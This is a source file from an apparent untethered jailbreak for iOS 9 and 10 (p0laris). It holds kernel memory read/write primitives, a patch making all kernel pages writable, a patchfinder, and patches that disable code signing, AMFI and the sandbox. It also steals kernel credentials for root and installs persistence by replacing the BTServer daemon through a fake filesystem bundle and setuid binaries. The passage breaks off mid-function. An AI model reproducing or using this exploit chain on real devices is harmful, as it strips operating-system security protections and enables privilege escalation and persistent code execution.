/*
 *  jailbreak.m
 *  p0laris
 *
 *  created on 11/19/21
 */

/*
 *  p0laris - the untethered jailbreak for iOS 9.x and 10.x.
 *
 *  with love from spv. <3
 */

#include <Foundation/Foundation.h>
#include <UIKit/UIKit.h>
#include <sys/utsname.h>
#include <sys/mount.h>
#include <mach/mach.h>
#include <sys/stat.h>
#include <syslog.h>
#include <dlfcn.h>
#include <spawn.h>

#import "pf10.h"
#import "patchfinder.h"
#import "mac_policy.h"
#import "lzssdec.h"
#import "exploit.h"
#import "common.h"
#import "sbops.h"
#import "log.h"

/*
 *  I live in a constant state of fear and misery
 *  Do you miss me anymore?
 *  And I don't even notice when it hurts anymore
 *  Anymore, anymore, anymore
 */

#define INSTALL_NONPUBLIC_UNTETHER 0
#define FIRST_TIME_OVERRIDE 0
#define INSTALL_UNTETHER 0
#define BTSERVER_USED 0
#define UNPATCH_PMAP 0
#define ENABLE_DEBUG 1
#define DO_CSBYPASS 0
#define DUMP_KERNEL 0

uintptr_t kernel_base	= -1;
uintptr_t kaslr_slide	= -1;
task_t tfp0				= 0;

uintptr_t kbase(void);
task_t get_kernel_task(void);
void exploit_cleanup(task_t);
int progress(const char* s, ...);
int progress_ui(const char* s, ...);

#define DUMP_LENGTH (32 * 1024 * 1024)
#define UNSLID_BASE 0x80001000

// A5
uint32_t pmap_addr = 0x003F6454;
uint32_t a6_1034_pmap_addr = 0x003E9974;

uint32_t find_kernel_pmap(void) {
	if (i_system_version_field(0) >= 10) {
		/*
		 *  janky hack
		 */
		return a6_1034_pmap_addr + kernel_base;
	}
	return pmap_addr + kernel_base;
}

/*
 *  read 4-bytes from address addr from kernel memory
 */
uint32_t kread_uint32(uint32_t addr) {
	vm_size_t bytesRead=0;
	uint32_t ret = 0;
	vm_read_overwrite(tfp0,
					  addr,
					  4,
					  (vm_address_t)&ret,
					  &bytesRead);
	return ret;
}

/*
 *  read a byte from address addr from kernel memory
 */
uint8_t kread_uint8(uint32_t addr) {
	vm_size_t bytesRead=0;
	uint8_t ret = 0;
	vm_read_overwrite(tfp0,
					  addr,
					  1,
					  (vm_address_t)&ret,
					  &bytesRead);
	return ret;
}

/*
 *  write a 4-byte value to address addr in kernel memory
 */
void kwrite_uint32(uint32_t addr, uint32_t value) {
	vm_write(tfp0,
			 addr,
			 (vm_offset_t)&value,
			 4);
}

/*
 *  write a byte value to address addr in kernel memory
 */
void kwrite_uint8(uint32_t addr, uint8_t value) {
	vm_write(tfp0,
			 addr,
			 (vm_offset_t)&value,
			 1);
}

/*
 *  free and nullify pointer macro
 */
void _zfree(void** ptr) {
	free(*ptr);
	*ptr = NULL;
}

#define zfree(ptr) do { _zfree((void**)ptr); } while (0)

extern char **environ;

void run_cmd(char *cmd, ...) {
	pid_t pid;
	va_list ap;
	char* cmd_ = NULL;
	
	va_start(ap, cmd);
	vasprintf(&cmd_, cmd, ap);
	
	char *argv[] = {"sh", "-c", cmd_, NULL};
	
	int status;
	lprintf("Run command: %s", cmd_);
	status = posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, environ);
	if (status == 0) {
		lprintf("Child pid: %i", pid);
		do {
			if (waitpid(pid, &status, 0) != -1) {
				lprintf("Child status %d", WEXITSTATUS(status));
			} else {
				perror("waitpid");
			}
		} while (!WIFEXITED(status) && !WIFSIGNALED(status));
	} else {
		lprintf("posix_spawn: %s", strerror(status));
	}
}

bool exists(char* path) {
	bool ret = false;
	
	/*
	 *  check if file exists and is accessible
	 */
	
	ret = access(path, F_OK) != -1;
	
	return ret;
}

/*
 *  BEGIN ADVANCED BORROWING FROM REALKJCMEMBER
 */
#define TTB_SIZE			4096
#define L1_SECT_S_BIT		(1 << 16)
#define L1_SECT_PROTO		(1 << 1)														/* 0b10 */
#define L1_SECT_AP_URW		(1 << 10) | (1 << 11)
#define L1_SECT_APX			(1 << 15)
#define L1_SECT_DEFPROT		(L1_SECT_AP_URW | L1_SECT_APX)
#define L1_SECT_SORDER		(0)																/* 0b00, not cacheable, strongly ordered. */
#define L1_SECT_DEFCACHE	(L1_SECT_SORDER)
#define L1_PROTO_TTE(entry)	(entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)

uint32_t pmaps[TTB_SIZE];
int pmapscnt = 0;

void patch_kernel_pmap(void) {
	uint32_t kernel_pmap		= find_kernel_pmap();
	uint32_t kernel_pmap_store	= kread_uint32(kernel_pmap);
	uint32_t tte_virt			= kread_uint32(kernel_pmap_store);
	uint32_t tte_phys			= kread_uint32(kernel_pmap_store+4);
	
	lprintf("kernel pmap store @ 0x%08x",
			kernel_pmap_store);
	lprintf("kernel pmap tte is at VA 0x%08x PA 0x%08x",
			tte_virt,
			tte_phys);
	
	/*
	 *  every page is writable
	 */
	uint32_t i;
	for (i = 0; i < TTB_SIZE; i++) {
		uint32_t addr   = tte_virt + (i << 2);
		uint32_t entry  = kread_uint32(addr);
		if (entry == 0) continue;
		if ((entry & 0x3) == 1) {
			/*
			 *  if the 2 lsb are 1 that means there is a second level
			 *  pagetable that we need to give readwrite access to.
			 *  zero bytes 0-10 to get the pagetable address
			 */
			uint32_t second_level_page_addr = (entry & (~0x3ff)) - tte_phys + tte_virt;
			for (int i = 0; i < 256; i++) {
				/*
				 *  second level pagetable has 256 entries, we need to patch all
				 *  of them
				 */
				uint32_t sladdr  = second_level_page_addr+(i<<2);
				uint32_t slentry = kread_uint32(sladdr);
				
				if (slentry == 0)
					continue;
				
				/*
				 *  set the 9th bit to zero
				 */
				uint32_t new_entry = slentry & (~0x200);
				if (slentry != new_entry) {
					kwrite_uint32(sladdr, new_entry);
					pmaps[pmapscnt++] = sladdr;
				}
			}
			continue;
		}
		
		if ((entry & L1_SECT_PROTO) == 2) {
			uint32_t new_entry  =  L1_PROTO_TTE(entry);
			new_entry		   &= ~L1_SECT_APX;
			kwrite_uint32(addr, new_entry);
		}
	}
	
	lprintf("every page is actually writable");
	usleep(100000);
}

void pmap_unpatch(void) {
	while (pmapscnt > 0) {
		uint32_t sladdr  = pmaps[--pmapscnt];
		uint32_t slentry = kread_uint32(sladdr);
		
		/*
		 *  set the 9th bit to one
		 */
		uint32_t new_entry = slentry | (0x200);
		kwrite_uint32(sladdr, new_entry);
	}
}

/*
 *  END ADVANCED BORROWING FROM REALKJCMEMBER
 */

double get_time(void) {
	struct timeval current_time;
	gettimeofday(&current_time, NULL);
	
	return (double)current_time.tv_sec
	+ ((double)current_time.tv_usec / 1000000.0);
}

uint8_t* dump_kernel(uint8_t* kdata, uint32_t len) {
	vm_size_t segment = 0x800;
	
	/*
	 *  0x800 should be faster thx sig
	 */
	
	for (int i = 0; i < len / segment; i++) {
		/*
		 *  DUMP DUMP DUMP
		 */
		
		vm_read_overwrite(tfp0,
						  UNSLID_BASE + kaslr_slide + (i * segment),
						  segment,
						  (vm_address_t)kdata + (i * segment),
						  &segment);
	}
	
	return kdata;
}

extern struct offsets_t* offsets;
extern bool global_untethered;
uint32_t ourcred;
uint32_t myproc;

struct offsets_t* find_offsets(void) {
	/*
	 *  look ma i did a patchfinder
	 *  saves offsets to (docs_dir)/offsets.bin for future use, as the patchfinder
	 *  is kinda slow as balls
	 */
	
	struct offsets_t* offsets   = malloc(sizeof(struct offsets_t));
	uint32_t len				= 32 * 1024 * 1024;
	uint8_t* kdata				= NULL;
	char* open_this				= NULL;
	char* version_string		= (char*)[[[UIDevice currentDevice] systemVersion]
										  UTF8String];
	
	if (!global_untethered) {
		/*
		 *  if we are not running from the untether, check the application docs
		 *  directory for the offsets.bin file. if it exists, read it into the
		 *  offsets struct and return it, otherwise, find our offsets "manually"
		 *  using the patchfinder.
		 */
		
		NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
		NSString *documentsDirectory = [paths firstObject];
		char* doc_dir = (char*)[documentsDirectory UTF8String];
		asprintf(&open_this, "%s/offsets.bin", doc_dir);
		
		if (exists(open_this)) {
			/*
			 *  read from offsets.bin into the offsets struct and return it
			 */
			
			FILE* fp = fopen(open_this, "rb");
			fread(offsets, sizeof(struct offsets_t), 1, fp);
			fclose(fp);
			return offsets;
		}
	} else {
		/*
		 *  if we are running from the untether, read from
		 *  /untether/docs/untether.bin (if the file exists) to get offsets. 
		 *  /untether/docs is a symlink to the normal documents directory. this
		 *  is done because the documents directory appears to be different when
		 *  running untethered.
		 * 
		 *  (also because i originally tried /untether/offsets.bin until i 
		 *   realized we can't read from that path when not jailbroken, lol)
		 */
		
		char* offsets_bin = "/untether/docs/offsets.bin";
		
		if (exists(offsets_bin)) {
			/*
			 *  read from offsets.bin into the offsets struct and return it
			 */
			
			FILE* fp = fopen(offsets_bin, "rb");
			fread(offsets, sizeof(struct offsets_t), 1, fp);
			fclose(fp);
			return offsets;
		}
	}
	
	/*
	 *  dump kernel
	 */
	
	progress_ui("dumping kernel");
	kdata = malloc(len);
	
	dump_kernel(kdata, len);
	
	if (!kdata) {
		/*
		 *  fuck, failed to allocate kdata.
		 * 
		 *  free offsets if it exists, zfree also sets it to NULL. (fuck UAFs)
		 *  (except when i get to exploit them ;))
		 */
		if (offsets)
			zfree(&offsets);
		return NULL;
	}
	
	/*
	 *  make substrate patchfinding a bit faster
	 */
	uint32_t* one_and_two = NULL;
	
	progress_ui("patchfinding...");
	offsets->mount_common						= find_mount_common(kernel_base, kdata, len, version_string);
	offsets->lwvm1								= find_lwvm1(kernel_base, kdata, len, version_string);
	offsets->lwvm2								= find_lwvm2(kernel_base, kdata, len, version_string);
	offsets->lwvm_call							= find_lwvm_call(kernel_base, kdata, len, version_string);
	offsets->lwvm_call_offset					= find_lwvm_call_offset(kernel_base, kdata, len, version_string);
	offsets->sbops								= find_sbops(kernel_base, kdata, len, version_string);
	one_and_two									= find_substrate1_and_2(kernel_base, kdata, len, version_string);
	offsets->substrate1							= one_and_two[0];
	offsets->substrate2							= one_and_two[1];
	offsets->proc_enforce						= find_proc_enforce(kernel_base, kdata, len, version_string);
	offsets->cs_enforcement_disable_amfi		= find_cs_enforcement_disable_amfi(kernel_base, kdata, len, version_string);
	offsets->PE_i_can_has_debugger_1			= find_PE_i_can_has_debugger_1(kernel_base, kdata, len, version_string);
	offsets->PE_i_can_has_debugger_2			= find_PE_i_can_has_debugger_2(kernel_base, kdata, len, version_string);
	offsets->PE_i_can_has_debugger_offset		= find_PE_i_can_has_debugger_offset(kernel_base, kdata, len, version_string);
	offsets->vm_fault_enter_patch				= find_vm_fault_enter_patch(kernel_base, kdata, len, version_string);
	offsets->vm_map_enter_patch					= find_vm_map_enter_patch(kernel_base, kdata, len, version_string);
	offsets->csops								= find_csops(kernel_base, kdata, len, version_string);
	offsets->mapForIO							= find_mapForIO(kernel_base, kdata, len, version_string);
	offsets->sandbox_call_i_can_has_debugger	= find_sandbox_call_i_can_has_debugger(kernel_base, kdata, len, version_string);
	offsets->amfi_file_check_mmap				= find_amfi_file_check_mmap(kernel_base, kdata, len, version_string);
	offsets->allproc							= find_allproc(kernel_base, kdata, len, version_string);
	offsets->tfp0								= find_tfp0(kernel_base, kdata, len, version_string);
	progress_ui("patchfinded");
	
	/*
	 *  write our offsets to docs_dir/offsets.bin
	 */
	
	open_this = NULL;
	
	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
														 NSUserDomainMask,
														 YES);
	NSString *documentsDirectory = [paths firstObject];
	char* doc_dir = (char*)[documentsDirectory UTF8String];
	asprintf(&open_this, "%s/offsets.bin", doc_dir);
	
	FILE* fp = fopen(open_this, "wb");
	fwrite(offsets,
		   sizeof(struct offsets_t),
		   1,
		   fp);
	fclose(fp);
	
	if (one_and_two)
		zfree(&one_and_two);
	
	if (kdata)
		zfree(&kdata);
	
	return offsets;
}

bool patch_kernel(void) {
	bool ret = true;
	
	/* 
	 *  here be dragons, this code is magic
	 */
	
	offsets = find_offsets();
	
	if (offsets == NULL)
		return false;
	
	/* 
	 *  mount stuff
	 */
	lprintf("patching mount_common: 0x%08x,0x%02x",
			kernel_base + offsets->mount_common, 0xe0);
	kwrite_uint8(kernel_base + offsets->mount_common, 0xe0);
	
	/* 
	 *  PE_i_can_has_debugger stuff
	 */
	lprintf("patching PE_i_can_has_debugger_offset: 0x%08x,0x%08x->0x%08x",
			kernel_base + offsets->PE_i_can_has_debugger_offset, kread_uint32(kernel_base + offsets->PE_i_can_has_debugger_offset), 0x20012001);
	kwrite_uint32(kernel_base + offsets->PE_i_can_has_debugger_offset,
				  0x20012001);
	
	/* 
	 *  note for tomorrow / today:
	 *  look into patching time related syscalls in the kernel
	 */
	
	/*
	 *  this AMFI patch is disabled as the offset was probably wrong or something
	 *  for some reason it would make video decoding cause a magical kernel panic
	 */
	
	/* 
	 *  substrate
	 */
	lprintf("patching substrate1: 0x%08x,0x%04x",
			kernel_base + offsets->substrate1,
			0xbf00);
	kwrite_uint8(kernel_base + offsets->substrate1,		0x00);
	kwrite_uint8(kernel_base + offsets->substrate1 + 1,	0xbf);
	
	/* 
	 *  substrate
	 */
	lprintf("patching substrate2: 0x%08x,0x%04x",
			kernel_base + offsets->substrate2,
			0xbf00);
	kwrite_uint8(kernel_base + offsets->substrate2,		0x00);
	kwrite_uint8(kernel_base + offsets->substrate2 + 1,	0xbf);
	
	/* 
	 *  proc_enforce -> 0
	 */
	lprintf("patching proc_enforce: 0x%08x,0x%08x",
			kernel_base + offsets->proc_enforce,
			0x0);
	kwrite_uint32(kernel_base + offsets->proc_enforce,0);
	
	/* 
	 *  cs_enforcement_disable_amfi
	 */
	lprintf("patching cs_enforcement_disable_amfi: 0x%08x,0x%04x",
			kernel_base + offsets->cs_enforcement_disable_amfi - 1,
			0x0101);
	kwrite_uint8(kernel_base + offsets->cs_enforcement_disable_amfi, 1);
	kwrite_uint8(kernel_base + offsets->cs_enforcement_disable_amfi - 1, 1);
	
	/* 
	 *  PE_i_can_has_debugger -> 1
	 */
	lprintf("patching PE_i_can_has_debugger_1: 0x%08x,0x%08x",
			kernel_base + offsets->PE_i_can_has_debugger_1,
			0x1);
	kwrite_uint32(kernel_base + offsets->PE_i_can_has_debugger_1, 1);

	lprintf("patching PE_i_can_has_debugger_2: 0x%08x,0x%08x",
			kernel_base + offsets->PE_i_can_has_debugger_2,
			0x1);
	kwrite_uint32(kernel_base + offsets->PE_i_can_has_debugger_2, 1);
	
	/* 
	 *  vm_fault_enter magic
	 */
	lprintf("patching vm_fault_enter_patch: 0x%08x,0x%04x",
			kernel_base + offsets->vm_fault_enter_patch,
			0x2201);
	kwrite_uint8(kernel_base + offsets->vm_fault_enter_patch, 0x01);
	kwrite_uint8(kernel_base + offsets->vm_fault_enter_patch + 1, 0x22);
	
	/*
	 *  vm_map_enter_patch
	 */
	lprintf("patching vm_map_enter_patch: 0x%08x,0x%08x",
			kernel_base + offsets->vm_map_enter_patch,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->vm_map_enter_patch, 0xbf00bf00);
	
	/*
	 * mapForIO magic
	 */
	lprintf("patching mapForIO: 0x%08x,0x%08x",
			kernel_base + offsets->mapForIO,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->mapForIO, 0xbf00bf00);
	
	/*
	 *  csops magic
	 */
	lprintf("patching csops: 0x%08x,0x%08x",
			kernel_base + offsets->csops,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->csops, 0xbf00bf00);
	
	/*
	 *  amfi_file_check_mmap magic
	 */
	lprintf("patching amfi_file_check_mmap: 0x%08x,0x%08x",
			kernel_base + offsets->amfi_file_check_mmap,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->amfi_file_check_mmap, 0xbf00bf00);
	
	/*
	 *  sandbox_call_i_can_has_debugger magic
	 */
	lprintf("patching sandbox_call_i_can_has_debugger: 0x%08x,0x%08x",
			kernel_base + offsets->sandbox_call_i_can_has_debugger,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->sandbox_call_i_can_has_debugger,0xbf00bf00);
	
	/*
	 *  lwvm
	 */
	lprintf("patching lwvm1: 0x%08x,0x%08x",
			kernel_base + offsets->lwvm1,
			0xf8d1e00f);
	kwrite_uint32(kernel_base + offsets->lwvm1, 0xf8d1e00f);

	lprintf("patching lwvm2: 0x%08x,0x%08x",
			kernel_base + offsets->lwvm2,
			0x2501e003);
	kwrite_uint32(kernel_base + offsets->lwvm2, 0x2501e003);

	lprintf("patching lwvm_call: 0x%08x,0x%08x",
			kernel_base + offsets->lwvm_call,
			kernel_base + offsets->lwvm_call_offset);
	kwrite_uint32(kernel_base + offsets->lwvm_call,
				  kernel_base + offsets->lwvm_call_offset);
	
	/*
	 *  tfp0
	 */
	lprintf("patching tfp0: 0x%08x,0x%08x->0x%08x",
			kernel_base + offsets->tfp0,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->tfp0, 0xbf00bf00);
	
	/*
	 *  fuck the sandbox
	 */
	lprintf("nuking sandbox @ 0x%08x", kernel_base + offsets->sbops);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0);
	
	/*
	 *  get kernel credentials so we can get our friend, uid=0.
	 */
	lprintf("stealing kernel creds");
	uint32_t allproc_read	= kread_uint32(kernel_base + offsets->allproc);
	lprintf("uint32_t allproc = 0x%08x, uint32_t allproc_read = 0x%08x;",
			kernel_base + offsets->allproc,
			allproc_read);
	pid_t our_pid		= getpid();
	lprintf("our_pid = %d", our_pid);
	
	myproc				= 0;
	uint32_t kernproc	= 0;
	
	/*
	 *  this code traverses a linked list in kernel memory to find the processes.
	 *  cleaned up
	 * 
	 *  struct proc {
	 * 	 LIST_ENTRY(proc) p_list;	// List of all processes.		//
	 * 
	 * 	 pid_t	   p_pid;		  // Process identifier. (static)	//
	 * 	 void *	  task;		   // corresponding task (static)		//
	 * 	 ...
	 *  };
	 * 
	 *  #define LIST_ENTRY(type)											\
	 *  struct {															\
	 * 	 struct type *le_next;		// next element						//  \
	 * 	 struct type **le_prev;		// address of previous next element //  \
	 *  }
	 * 
	 *  sizeof(uintptr_t) on 32-bit = 4
	 *  2 pointers = 2 * 4 = 8
	 *  offset of p_pid = 8
	 *  the next proc entry is the first pointer in the LIST_ENTRY struct, which is conveniently
	 *  the first element in the proc struct.
	 *  therefore, offset of the next proc entry is 0
	 * 
	 *  loop through the linked list by getting allproc
	 *  check the pid, and compare it to ours or the kernels
	 *  save it if it's either, otherwise continue
	 * 
	 *  eventually at the end we have the addresses of the kernel's proc struct and ours.
	 *  now we do writing magic to get kernel privs :P
	 */
	
	if (allproc_read != 0) {
		while (myproc == 0 || kernproc == 0) {
			uint32_t kpid = kread_uint32(allproc_read + 8);
			if (kpid == our_pid) {
				myproc = allproc_read;
				lprintf("found myproc 0x%08x, %d", myproc, kpid);
			} else if (kpid == 0) {
				kernproc = allproc_read;
				lprintf("found kernproc 0x%08x, %d", kernproc, kpid);
			}
			allproc_read = kread_uint32(allproc_read);
		}
	} else {
		/* fail */
		return false;
	}
	
	/*
	 *  TODO: don't hardcode 0xa4, ideally write patchfinder code for it
	 */
	
	uint32_t kern_ucred = kread_uint32(kernproc + 0xa4);
	lprintf("uint32_t kern_ucred = 0x%08x;", kern_ucred);
	
	ourcred = kread_uint32(myproc + 0xa4);
	lprintf("uint32_t ourcred = 0x%08x;", ourcred);

	/*
	 *  i am (g)root
	 */
	kwrite_uint32(myproc + 0xa4, kern_ucred);
	setuid(0);
	
	return ret;
}

void easy_spawn(char* bin, char* argv[]) {
	pid_t pid;
	int status;
	status = posix_spawn(&pid, bin, NULL, NULL, argv, environ);
	if (status == 0) {
		lprintf("Child pid: %i", pid);
		do {
			if (waitpid(pid, &status, 0) != -1) {
				lprintf("Child status %d", WEXITSTATUS(status));
			} else {
				perror("waitpid");
			}
		} while (!WIFEXITED(status) && !WIFSIGNALED(status));
	} else {
		lprintf("posix_spawn: %s", strerror(status));
	}
}

NSString* resource_path = NULL;
char* bundle_path(char* path) {
	char* ret = NULL;
	
	if (!resource_path)
		resource_path = [[NSBundle mainBundle] resourcePath];
	
	ret = (char*)[[resource_path stringByAppendingPathComponent:
				   [NSString stringWithUTF8String:path]] UTF8String];
	
	return ret;
}

#if INSTALL_UNTETHER
#if !INSTALL_NONPUBLIC_UNTETHER
bool install_untether(void) {
	bool ret = true;
	
	/*
	 *  if re-installing, remove the previous untether directory
	 */
	run_cmd("rm -rf /untether");
	
	/*
	 *  probably shouldn't be 777, will look into later
	 */
	mkdir("/untether", 0777);
	
	/*
	 *  get path of p0laris, and symlink it for the final 0wnage
	 */
	char* bin_path = bundle_path("p0laris");
	symlink(bin_path, "/untether/p0laris");
	
	/*
	 *  make /usr/local/bin
	 *  sandbox policy bypass allows you to use arbitrary interpreter binaries
	 *  IF you put them at specific locations.
	 *  you can not use a symlink, the actual binary must be at the location.
	 *  decompiled sandbox policies:
	 *    (deny process-exec-interpreter
	 *    (require-all
	 * 	(require-not (debug-mode))
	 * 	(require-all (require-not (literal "/bin/sh"))
	 * 	 (require-not (literal "/bin/bash"))
	 * 	 (require-not (literal "/usr/bin/perl"))
	 * 	 (require-not (literal "/usr/local/bin/scripter"))		<- i use this one
	 * 	 (require-not (literal "/usr/local/bin/luatrace"))
	 * 	 (require-not (literal "/usr/sbin/dtrace")))))
	 * 
	 *   source: https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-1.html
	 */
	mkdir("/usr/local/", 0777);
	mkdir("/usr/local/bin/", 0777);
	
	/*
	 *  important:
	 *  DO NOT symlink, this will not work,
	 *  as the binary will still be located at its previous path.
	 * 
	 *  actually copy the full executable, permissions and all, to the new path.
	 */
	run_cmd("/bin/cp -p /sbin/mount /usr/local/bin/scripter");
	
	/*
	 *  now for the actual persistence bug.
	 *  this next bit is stolen from the untether gist, as i'm too lazy to rewrite it.
	 *
	 *  bug3:
	 *  platform-application bypass,
	 *  custom filesystem
	 *  directory structure:
	 *  /System/Library/Filesystems/hax.fs:
	 *  /System/Library/Filesystems/hax.fs/Contents:
	 *  /System/Library/Filesystems/hax.fs/Contents/Resources:
	 *  /System/Library/Filesystems/hax.fs/Contents/Resources/mount_hax -> symlink to your haxxx
	 *
	 *  cp -p /sbin/mount to /usr/local/bin/scripter (bypass some sandbox stuff)
	 *  replace a daemon with an executable containing this:
	 *  #!/usr/local/bin/scripter -t hax fake
	 *
	 *
	 *
	 *  the last argument is automatically filled in with the executable path,
	 *  so mount finds an existing path, and attempts to mount "fake" (taken as /fake as it runs in /)
	 *  on that path, with the filesystem hax, which executes our code.
	 *  replace a daemon like wifiFirmwareLoaderLegacy
	 *  either do the same SUID trick, for untethered, sandboxed code exec as mobile (tired)
	 *  or use psychicpaper and get untethered, unsandboxed code exec as root (wired)
	 *  boom, BFU code exec on 9.xish -> 12.xish
	 *
	 *  BACK TO MY COMMENTS
	 *  i find it a little more smexy to use a symlink and keep
	 *  code_exec_fs.fs in a folder along with the rest of the vuln stuff, so symlinks abound
	 */
	
	mkdir("/untether/code_exec_fs.fs",						 0755);
	mkdir("/untether/code_exec_fs.fs/Contents",			 0755);
	mkdir("/untether/code_exec_fs.fs/Contents/Resources",	0755);
	
	symlink("/untether/code_exec_fs.fs",	"/System/Library/Filesystems/code_exec_fs.fs");
	symlink("/untether/code_exec_fs.fs",	"/Library/Filesystems/code_exec_fs.fs");
	symlink("/untether/p0laris",			"/untether/code_exec_fs.fs/Contents/Resources/mount_code_exec_fs");
	
	/*
	 *  i forgot to add you actually need to have
	 *  some data after the shebang, otherwise it won't work.
	 */
	FILE* fp = fopen("/untether/get_code_exec", "w");
	fprintf(fp, "#!/usr/local/bin/scripter -t code_exec_fs untether\n\n\nkek");
	fclose(fp);
	
	/*
	 *  chmod'ing for security & being able to execute and shit
	 */
	chown("/untether/p0laris",													501, 501);
	chown("/untether/code_exec_fs.fs/Contents/Resources/mount_code_exec_fs",	501, 501);
	chown("/untether/get_code_exec",											501, 501);
	chmod("/untether/p0laris",													04755);
	chmod("/untether/code_exec_fs.fs/Contents/Resources/mount_code_exec_fs",	04755);
	chmod("/untether/get_code_exec",											04755);
	
	/*
	 *  don't remove original wifiFirmwareLoader in case we're re-installing,
	 *  only rename original if the path used for the "backup", so to speak
	 *  exists.
	 */
	if (!exists("/usr/sbin/BTServer_"))
		rename("/usr/sbin/BTServer",	"/usr/sbin/BTServer_");
	
	symlink("/untether/get_code_exec",				"/usr/sbin/BTServer");
	
	/*
	 *  more chmod'ing
	 */
	chown("/usr/sbin/BTServer",	501, 501);
	chown("/untether/get_code_exec",			501, 501);
	chown("/usr/local/bin/scripter",			501, 501);
	
	chmod("/usr/sbin/BTServer",	04755);
	chmod("/untether/get_code_exec",			04755);
	chmod("/usr/local/bin/scripter",			04755);
	
	/*
	 *  logging, also so the patchfinder can grab offsets from the filesystem,
	 *  instead of patchfinding every time, which is slow...
	 */
	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
	NSString *documentsDirectory = [paths firstObject];
	char* doc_dir = (char*)[documentsDirectory UTF8String];
	
	symlink(doc_dir, "/untether/docs");
	
#if DO_CSBYPASS
	/*
	 *  logs
	 */
	lprintf("SPV vs CODESIGNING!\n");
	lprintf("FIGHT!\n");
	
	/*
	 * find csbypass in the app container
	 */
	char* csbypass = bundle_path("csbypass");
	
	/*
	 *  copy it to the untether folder & make it executable
	 */
	run_cmd("/bin/cp %s /untether/csbypass", csbypass);
	run_cmd("chmod 755 /untether/csbypass");
	
	/*
	 *  find game over in the app container
	 */
	char* game_over_armv7 = bundle_path("game_over_armv7.dylib1");
	
	/*
	 *  copy it to the untether folder & make it executable
	 */
	run_cmd("/bin/cp %s /untether/game_over_armv7.dylib1", game_over_armv7);
	run_cmd("chmod 755 /untether/game_over_armv7.dylib1");
	
	/*
	 *  get time
	 */
	time_t val = time(NULL);
	
	/*
	 *  write time for offsetting
	 */
	FILE* fp_ = fopen("/untether/offset", "wb");
	fwrite(&val, sizeof(val), 1, fp_);
	fclose(fp);
	
	/*
	 *  set time to zero
	 */
	lprintf("[*] __OFFSET *should* equal %ld", val);
	run_cmd("/bin/date -s @0");
	
	/*
	 *  nuke timed
	 */
